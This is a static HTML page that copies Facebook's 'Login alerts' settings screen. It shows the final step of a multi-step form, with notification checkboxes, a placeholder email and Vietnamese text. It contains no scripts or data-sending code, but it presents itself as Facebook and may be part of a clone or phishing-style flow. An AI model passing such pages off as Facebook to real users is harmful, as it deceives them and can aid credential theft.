<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="icon" href="./Image/icon.png" />
    <link rel="stylesheet" href="Css/body.css">
    <link rel="stylesheet" href="Css/Privacy2.css">
</head>

<body>
    <div class="step-container">
        <div class="multi-step-form">
            <div class="step active">
                <div class="mobile_header">
                    <button class="back_header" >
                        <i class="icon-back"></i>
                    </button>
                    <div class="title_header">
                        <span>Login alerts</span>
                    </div>
                    <div class="back_header"></div>
                </div>
                <div class="title2">
                    <div class="icon-wrapper">
                        <button
                            class="event_back_step"
                        >
                            <i class="icon-back"></i>
                        </button>
                    </div>
                    <span>Bật cảnh báo</span>
                </div>
                <hr />
                <div class="text-info">
                    <h2>Control your alerts</h2>
                    <p>
                        Tel us how to notify you if someone logs into your
                        account from a place we don't recognize. We'll tell
                        you which device was used and where it's located
                    </p>
                </div>

                <div class="send_notifycation_container">
                    <div class="send_notifycation_wrapper">
                        <div class="item_noti">
                            <div class="item_noti_icon">
                                <i class="icon_facebook"></i>
                            </div>
                            <div class="item_noti_text">
                                <p>Facebook</p>
                                <span>
                                    We'll send you a Facebook notification
                                </span>
                            </div>
                            <div class="multi__language">
                                <input
                                    type="checkbox"
                                    class="lang__check"
                                />
                            </div>
                        </div>
                        <div class="item_noti">
                            <div class="item_noti_icon">
                                <i class="icon_email"></i>
                            </div>
                            <div class="item_noti_text">
                                <p>Email</p>
                                <span>
                                    We'll send an alert to aaa@gmail.com
                                </span>
                            </div>
                            <div class="multi__language">
                                <input
                                    type="checkbox"
                                    class="lang__check"
                                />
                            </div>
                        </div>
                    </div>
                </div>

                <div class="progressBar">
                    <div style="width: 100%" class="progress"></div>
                </div>
                <div class="event_button_container">
                    <div class="event_button_wrapper">
                        <div class="progressBar_mobile">
                            <div class="dot_mobile "> </div>
                            <div class="dot_mobile "> </div>
                            <div class="dot_mobile "> </div>
                            <div class="dot_mobile active"> </div>
                        </div>
                        <button class="event_back">
                            Back
                        </button>
                        <button class="event_continue">
                            Next
                        </button>
                    </div>
                </div>
            </div>
        </div>
</body>

</html>
